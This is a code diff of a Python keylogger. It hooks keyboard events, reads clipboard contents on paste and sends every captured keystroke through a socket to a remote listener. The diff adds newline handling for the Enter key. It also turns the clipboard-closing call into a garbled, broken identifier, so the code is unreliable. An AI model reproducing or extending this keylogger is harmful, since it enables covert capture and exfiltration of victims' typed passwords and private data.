@@ -78,14 +78,19 @@ while 1:
             if event.Key == "V":
                 win32clipboard.OpenClipboard()
                 pasted_value = win32clipboard.GetClipboardData()
-                win32clipboard.CloseClipboard()
+                win32clipboardnloeClipboard()
                 print "[PASTE] - %s" % (pasted_value),
 
             # Excludes spaces, can remove if needed
-            elif event.Key != "Space":
+            if event.Key != "Space":
                 s.send("[%s]" % event.Key)
 
-            elif event.Key == "Space":
+            # new line when enter key is pressed for readability
+            if event.Key == "Return":
+                s.send("\n")
+
+            # does not process the space command. Can remove later
+            if event.Key == "Space":
                 s.send(' ')
                
         # pass execution to next hook registered 
